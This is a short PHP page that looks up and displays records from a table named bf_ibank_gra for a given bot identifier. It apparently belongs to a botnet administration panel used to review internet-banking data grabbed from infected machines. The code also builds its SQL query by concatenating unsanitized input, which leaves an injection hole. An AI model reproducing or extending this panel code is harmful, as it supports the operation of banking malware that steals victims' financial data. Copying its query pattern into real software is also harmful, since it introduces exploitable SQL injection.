<?php
get_function('size_format');

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

if(empty($Cur['str'])) exit;

$matches = explode('0', $Cur['str'], 2);
if(!empty($matches[0]) && !empty($matches[1])){	$prefix = $matches[0];
	$uid = '0' . $matches[1];
}else{	exit;
}



$item = $mysqli->query('SELECT * FROM bf_ibank_gra WHERE (prefix = \''.$prefix.'\') AND (uid = \''.$uid.'\') ORDER by post_date DESC', null, null, false);
$smarty->assign('items', $item);
$smarty->assign('title', 'BOT: ' . $prefix . $uid);

?>